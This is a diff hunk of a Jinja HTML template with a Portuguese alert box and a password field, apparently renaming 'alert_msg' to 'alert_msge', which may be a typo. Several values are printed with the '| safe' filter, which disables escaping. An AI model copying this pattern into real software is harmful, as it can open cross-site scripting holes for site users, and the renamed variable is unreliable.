@@ -50,7 +50,7 @@
         <div class="alert-content">
             <h1 class="alert-type">{{ alert_type | safe }}</h1>
             <p style="display: block" class="alert-message">Preencha o campo abaixo.</p>
-            <p style="display: block" class="alert-more">{{ alert_msg | safe }}</p>
+            <p style="display: block" class="alert-more">{{ alert_msge | safe }}</p>
             <form style="display: flex;" id="form-field" method="post" action="{{ alert_more }}">
                 <label for="input"></label>
                 <input style="font-size: 14px;background-color: #efefef;" id="input" name="input" type="password" minlength="6" maxlength="30" placeholder="{{ url_return }}" required>
